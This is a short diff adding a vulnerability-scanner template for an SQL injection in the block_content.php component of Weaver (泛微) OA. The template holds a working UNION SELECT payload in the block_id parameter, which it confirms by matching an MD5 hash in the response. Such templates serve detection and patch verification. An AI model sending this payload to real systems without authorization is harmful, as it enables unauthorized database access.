@@ -1,0 +1,22 @@
+id: weaver-oa-block_content-sql
+
+info:
+  name: 泛微OA系统block_content.php组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+      
+      通过分析泛微OA系统中block_content.php文件的参数处理逻辑，发现其在数据验证环节存在SQL语法构造缺陷。攻击者可利用特定格式的输入参数绕过类型约束，在数据库查询语句中注入恶意SQL代码片段，实现对后端数据库的未授权访问与操作。该漏洞影响所有未应用最新安全补丁的部署实例。
+  tags: 泛微OA
+
+http:
+- raw:
+  - |
+    GET /general/new_mytable/block_content.php?block_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x71787a6a71,IFNULL(CAST(md5(123456)%20AS%20NCHAR),0x20),0x7171627671)--%20- HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'e10adc3949'
